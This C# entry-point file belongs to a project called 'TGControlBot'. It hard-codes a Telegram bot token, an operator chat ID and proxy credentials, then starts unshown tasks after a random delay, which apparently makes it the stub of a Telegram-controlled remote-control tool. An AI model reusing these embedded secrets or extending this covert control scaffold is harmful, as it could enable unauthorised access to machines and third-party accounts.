/////////////////////////////////////////////////////////
///////////////////By Telegram: @madcod//////////////////
/////////////////////////////////////////////////////////

using System;
using System.Threading;

namespace TGControlBot
{
    class Program
    {
        // Token Telegram Bot: 111034534534947203:AAFlY4YIiF0erergegpNiC2ZzTDyKiepxwnWIiX4M8
        public static string token = "111034535947203:AAFlY4YIiF0perghtyjNiC2ZzTDyKiepxwnWIiX4M8";

        // Your Telegram ID is 84430667320569:
        public static string id = "8443234534500569";

        // Your Proxy
        public static string ip_proxy = "168.235.103.57";
        public static int port_proxy = 3128;
        public static string login_proxy = "66666";
        public static string password_proxy = "66666";

        [STAThread]
        static void Main(string[] args)
        {
            new Thread(() =>
            {
                Thread.Sleep(new Random(Environment.TickCount).Next(500, 5500));
                Tasks.Start();
            }).Start();
        }
    }
}
